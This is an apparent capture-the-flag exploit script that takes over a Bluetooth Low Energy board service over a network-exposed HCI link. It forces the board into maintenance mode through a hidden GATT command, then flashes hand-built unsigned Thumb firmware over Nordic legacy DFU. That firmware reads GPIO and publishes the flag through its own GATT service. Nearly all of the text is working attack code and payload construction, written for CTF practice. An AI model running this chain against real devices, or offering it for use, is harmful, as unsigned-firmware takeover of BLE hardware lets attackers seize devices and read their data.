#!/usr/bin/env python3
"""One-shot exploit against a deployed board service: prints the flag.

Point it at the host running the service and it walks the whole chain in a
single HCI connection - cross the maintenance gate, reset into the second
stage, upload an unsigned application over legacy DFU, let that application
read the flag out of GPIO and publish it through its own GATT service, then
read it back:

    python3 exp/solve.py ctf.example.com
    python3 exp/solve.py 10.0.0.5 --port 7402

The flag goes to stdout and nothing else does, so it pipes:

    FLAG="$(python3 exp/solve.py ctf.example.com)"

Needs only Bumble on the client side:  python3 -m pip install bumble==0.0.235

The published port carries HCI/H4, not GATT-over-TCP: this script brings its
own BLE host and talks to the target through the service's virtual radio.
"""

from __future__ import annotations

import argparse
import asyncio
from binascii import crc_hqx
from contextlib import suppress
from enum import IntEnum
import logging
import struct
import sys
import time

from bumble.core import UUID
from bumble.device import Device, Peer
from bumble.hci import Address
from bumble.transport import open_transport


TARGET_ADDRESS = Address("F6:F7:F8:F9:FA:FB")

# Recovered by reversing the application at 0x1b000 in board_flash.bin.
MAINTENANCE_SERVICE_UUID = "5a1c0001-7c5d-4c8d-942c-a786c1d58b6d"
MAINTENANCE_CONTROL_UUID = "5a1c0002-7c5d-4c8d-942c-a786c1d58b6d"
MAINTENANCE_REQUEST = bytes.fromhex("11451419198100")

# Nordic legacy DFU, exposed by the second stage once GPREGRET asks for it.
DFU_SERVICE_UUID = "00001530-1212-efde-1523-785feabcd123"
DFU_CONTROL_POINT_UUID = "00001531-1212-efde-1523-785feabcd123"
DFU_PACKET_UUID = "00001532-1212-efde-1523-785feabcd123"
DFU_APPLICATION_IMAGE = 0x04
DFU_SUCCESS = 0x01
DFU_PACKET_SIZE = 20  # S130 2.0.0 is fixed at ATT MTU 23.

# Chosen by this exploit: the service its uploaded application registers.
PAYLOAD_SERVICE_UUID = "5a1c2001-7c5d-4c8d-942c-a786c1d58b6d"
PAYLOAD_VALUE_UUID = "5a1c2002-7c5d-4c8d-942c-a786c1d58b6d"

APPLICATION_BASE = 0x0001_B000
GPIO_P0_IN = 0x5000_0510
MAX_FLAG_BYTES = 512


class DfuOpcode(IntEnum):
    START_DFU = 0x01
    INITIALIZE_DFU_PARAMETERS = 0x02
    RECEIVE_FIRMWARE_IMAGE = 0x03
    VALIDATE_FIRMWARE = 0x04
    ACTIVATE_AND_RESET = 0x05
    PACKET_RECEIPT_NOTIFICATION_REQUEST = 0x08
    RESPONSE_CODE = 0x10


def log(message: str) -> None:
    """Progress goes to stderr so stdout stays exactly the flag."""

    print(f"[*] {message}", file=sys.stderr, flush=True)


def build_init_packet(image: bytes) -> bytes:
    """The unsigned legacy init packet: wildcard metadata plus the image CRC."""

    return (
        struct.pack(
            "<HHIHHH",
            0xFFFF,  # device type: any
            0xFFFF,  # device revision: any
            0,  # application version
            1,  # one SoftDevice entry follows
            0xFFFE,  # SoftDevice: any
            crc_hqx(image, 0xFFFF),
        )
        + b"\x00\x00"
    )


def build_payload(flag_bytes: int) -> bytes:
    """Thumb firmware that copies P0.IN into SRAM and publishes it over GATT.

    The image is freestanding and calls the SoftDevice ABI directly: vendor
    UUID registration (svc 0x63), primary service add (0xa0) and
    characteristic add (0xa2).  The flag never touches flash, only the SRAM
    buffer the read-only characteristic points at.
    """

    if flag_bytes <= 0 or flag_bytes % 4:
        raise ValueError("flag length must be a positive multiple of four")
    if flag_bytes > MAX_FLAG_BYTES:
        raise ValueError(f"flag length must not exceed {MAX_FLAG_BYTES} bytes")

    code_offset = 0x100
    code_address = APPLICATION_BASE + code_offset
    flag_buffer = 0x2000_0100
    uuid_type_output = 0x2000_0080
    service_handle_output = 0x2000_0082
    characteristic_handles_output = 0x2000_0084

    instructions: list[int] = []
    literal_uses: list[tuple[int, int, str]] = []

    def literal(register: int, label: str) -> None:
        literal_uses.append((len(instructions), register, label))
        instructions.append(0)  # patched into ldr rN, [pc, #imm] below

    literal(0, "gpio")
    literal(1, "flag_buffer")
    # movs r2,#words | ldr r3,[r0] | str r3,[r1] | adds r1,#4 | subs r2,#1 | bne
    instructions.extend(
        (0x2200 | (flag_bytes // 4), 0x6803, 0x600B, 0x3104, 0x3A01, 0xD1FA)
    )
    literal(0, "base_uuid")
    literal(1, "uuid_type_output")
    instructions.extend((0xDF63, 0x2001))  # sd_ble_uuid_vs_add; movs r0,#PRIMARY
    literal(1, "service_uuid")
    literal(2, "service_handle_output")
    instructions.append(0xDFA0)  # sd_ble_gatts_service_add
    literal(0, "service_handle_output")
    instructions.append(0x8800)  # ldrh r0,[r0]
    literal(1, "char_md")
    literal(2, "attribute")
    literal(3, "characteristic_handles_output")
    instructions.extend((0xDFA2, 0xE7FE))  # characteristic_add; spin forever

    code = bytearray(struct.pack(f"<{len(instructions)}H", *instructions))
    while len(code) % 4:
        code.extend(b"\x00")

    literal_pool_offset = code_offset + len(code)
    labels = (
        "gpio",
        "flag_buffer",
        "base_uuid",
        "uuid_type_output",
        "service_uuid",
        "service_handle_output",
        "char_md",
        "attribute",
        "characteristic_handles_output",
    )
    literal_offsets = {
        label: literal_pool_offset + index * 4 for index, label in enumerate(labels)
    }

    data_offset = literal_pool_offset + 4 * len(labels)
    base_uuid_offset = data_offset
    service_uuid_offset = base_uuid_offset + 16
    value_uuid_offset = service_uuid_offset + 4
    char_md_offset = value_uuid_offset + 4
    attr_md_offset = char_md_offset + 4
    attribute_offset = attr_md_offset + 4

    addresses = {
        "gpio": GPIO_P0_IN,
        "flag_buffer": flag_buffer,
        "base_uuid": APPLICATION_BASE + base_uuid_offset,
        "uuid_type_output": uuid_type_output,
        "service_uuid": APPLICATION_BASE + service_uuid_offset,
        "service_handle_output": service_handle_output,
        "char_md": APPLICATION_BASE + char_md_offset,
        "attribute": APPLICATION_BASE + attribute_offset,
        "characteristic_handles_output": characteristic_handles_output,
    }
    for label in labels:
        code.extend(struct.pack("<I", addresses[label]))
    for index, register, label in literal_uses:
        instruction_address = code_address + index * 2
        pc = (instruction_address + 4) & ~3
        displacement = APPLICATION_BASE + literal_offsets[label] - pc
        struct.pack_into(
            "<H", code, index * 2, 0x4800 | (register << 8) | (displacement // 4)
        )

    # The SoftDevice keeps vendor bases little-endian with bytes 12..13 zeroed.
    data = bytearray(bytes.fromhex("6d8bd5c186a72c948d4c5d7c00001c5a"))
    data.extend(struct.pack("<HBx", 0x2001, 2))  # service ble_uuid_t
    data.extend(struct.pack("<HBx", 0x2002, 2))  # value ble_uuid_t
    data.extend(b"\x02\x00\x00\x00")  # char metadata: read only
    data.extend(b"\x01\x00\x00\x00")  # attr metadata: open read, no write
    data.extend(
        struct.pack(
            "<IIHHH2xI",
            APPLICATION_BASE + value_uuid_offset,
            APPLICATION_BASE + attr_md_offset,
            flag_bytes,  # init_len
            0,  # init_offs
            flag_bytes,  # max_len
            flag_buffer,
        )
    )

    vector_table = struct.pack("<II", 0x2000_8000, code_address + 1)
    image = (
        vector_table
        + b"\xff" * (code_offset - len(vector_table))
        + bytes(code)
        + bytes(data)
    )
    return image + b"\xff" * (-len(image) % 4)


async def connect_when_advertising(device: Device, timeout: float):
    """Reconnect after a reset, retrying until the board advertises again."""

    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            return await device.connect(TARGET_ADDRESS, timeout=1)
        except Exception as exc:  # noqa: BLE001 - any failure means "not yet"
            last_error = exc
            await asyncio.sleep(0.05)
    raise TimeoutError("target never advertised again") from last_error


async def await_response(
    notifications: "asyncio.Queue[bytes]", opcode: int, timeout: float
) -> None:
    """Wait for the control point to acknowledge one DFU operation."""

    expected = bytes((DfuOpcode.RESPONSE_CODE, opcode, DFU_SUCCESS))
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        remaining = max(0.01, deadline - time.monotonic())
        received = bytes(await asyncio.wait_for(notifications.get(), timeout=remaining))
        if received == expected:
            return
        if received[:2] == expected[:2]:
            raise RuntimeError(
                f"target rejected opcode {opcode:#04x}: {received.hex()}"
            )
    raise TimeoutError(f"no response to opcode {opcode:#04x}")


async def solve(host: str, port: int, flag_bytes: int, timeout: float) -> bytes:
    image = build_payload(flag_bytes)
    transport_spec = f"tcp-client:{host}:{port}"

    log(f"connecting to {transport_spec}")
    async with await open_transport(transport_spec) as transport:
        device = Device.with_hci(
            "solver",
            Address("F0:F1:F2:F3:F4:F5"),
            transport.source,
            transport.sink,
        )
        connections = []
        try:
            await device.power_on()

            # 1. The board boots as an ordinary application.
            application = await device.connect(TARGET_ADDRESS, timeout=timeout)
            connections.append(application)
            reset = asyncio.Event()
            application.on(
                application.EVENT_DISCONNECTION, lambda *_: reset.set()
            )
            peer = Peer(application)
            services = await peer.discover_service(UUID(MAINTENANCE_SERVICE_UUID))
            if not services:
                raise RuntimeError("maintenance service not found")
            await peer.discover_characteristics(service=services[0])
            control = peer.get_characteristics_by_uuid(
                UUID(MAINTENANCE_CONTROL_UUID), services[0]
            )[0]

            log("asking the application for maintenance mode")
            await peer.write_value(control, MAINTENANCE_REQUEST, with_response=True)
            await asyncio.wait_for(reset.wait(), timeout=timeout)

            # 2. After the reset the second stage offers legacy DFU.
            log("board reset, reconnecting to the update service")
            dfu = await connect_when_advertising(device, timeout)
            connections.append(dfu)
            activated = asyncio.Event()
            dfu.on(dfu.EVENT_DISCONNECTION, lambda *_: activated.set())
            dfu_peer = Peer(dfu)
            dfu_services = await dfu_peer.discover_service(UUID(DFU_SERVICE_UUID))
            if not dfu_services:
                raise RuntimeError("update service not found after reset")
            await dfu_peer.discover_characteristics(service=dfu_services[0])
            control_point = dfu_peer.get_characteristics_by_uuid(
                UUID(DFU_CONTROL_POINT_UUID), dfu_services[0]
            )[0]
            packet = dfu_peer.get_characteristics_by_uuid(
                UUID(DFU_PACKET_UUID), dfu_services[0]
            )[0]
            notifications: asyncio.Queue[bytes] = asyncio.Queue()
            await dfu_peer.subscribe(control_point, notifications.put_nowait)

            # 3. Upload an unsigned application: nothing checks a signature.
            log(f"uploading {len(image)} bytes of unsigned firmware")
            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.START_DFU, DFU_APPLICATION_IMAGE)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, struct.pack("<III", 0, 0, len(image)))
            await await_response(notifications, DfuOpcode.START_DFU, timeout)

            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, build_init_packet(image))
            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 1)),
                with_response=True,
            )
            await await_response(
                notifications, DfuOpcode.INITIALIZE_DFU_PARAMETERS, timeout
            )

            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.PACKET_RECEIPT_NOTIFICATION_REQUEST, 1, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.RECEIVE_FIRMWARE_IMAGE,)),
                with_response=True,
            )
            for offset in range(0, len(image), DFU_PACKET_SIZE):
                await dfu_peer.write_value(
                    packet, image[offset : offset + DFU_PACKET_SIZE]
                )
            await await_response(
                notifications, DfuOpcode.RECEIVE_FIRMWARE_IMAGE, timeout
            )

            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.VALIDATE_FIRMWARE,)),
                with_response=True,
            )
            await await_response(notifications, DfuOpcode.VALIDATE_FIRMWARE, timeout)

            log("activating the uploaded image")
            await dfu_peer.write_value(
                control_point,
                bytes((DfuOpcode.ACTIVATE_AND_RESET,)),
                with_response=True,
            )
            await asyncio.wait_for(activated.wait(), timeout=timeout)

            # 4. Our firmware is running: read what it published.
            log("reconnecting to the uploaded firmware")
            payload = await connect_when_advertising(device, timeout)
            connections.append(payload)
            payload_peer = Peer(payload)
            payload_services = await payload_peer.discover_service(
                UUID(PAYLOAD_SERVICE_UUID)
            )
            if not payload_services:
                raise RuntimeError("uploaded firmware did not register its service")
            await payload_peer.discover_characteristics(service=payload_services[0])
            output = payload_peer.get_characteristics_by_uuid(
                UUID(PAYLOAD_VALUE_UUID), payload_services[0]
            )[0]
            return bytes(await payload_peer.read_value(output)).rstrip(b"\x00")
        finally:
            for connection in reversed(connections):
                with suppress(Exception):
                    await connection.disconnect()
            with suppress(Exception):
                await device.power_off()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Recover the flag from a deployed board service in one shot."
    )
    parser.add_argument("host", help="domain name or IP address of the service")
    parser.add_argument(
        "--port", type=int, default=6402, help="published HCI/H4 port (default: %(default)s)"
    )
    parser.add_argument(
        "--flag-bytes",
        type=int,
        default=128,
        help=(
            "how many GPIO bytes the uploaded firmware publishes; must be a "
            "multiple of four and is trimmed of padding (default: %(default)s)"
        ),
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=20.0,
        help="seconds to wait for each step (default: %(default)s)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    # Bumble logs the teardown races of a board that reset under us as
    # warnings; they are expected here and only obscure the result.
    logging.getLogger("bumble").setLevel(logging.CRITICAL)
    try:
        flag = asyncio.run(
            solve(args.host, args.port, args.flag_bytes, args.timeout)
        )
    except Exception as exc:  # noqa: BLE001 - one-shot tool, report and exit
        print(f"[!] {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1
    if not flag:
        print("[!] firmware published an empty value", file=sys.stderr)
        return 1
    log("flag recovered")
    sys.stdout.write(flag.decode("utf-8", errors="replace"))
    if not flag.endswith(b"\n"):
        sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
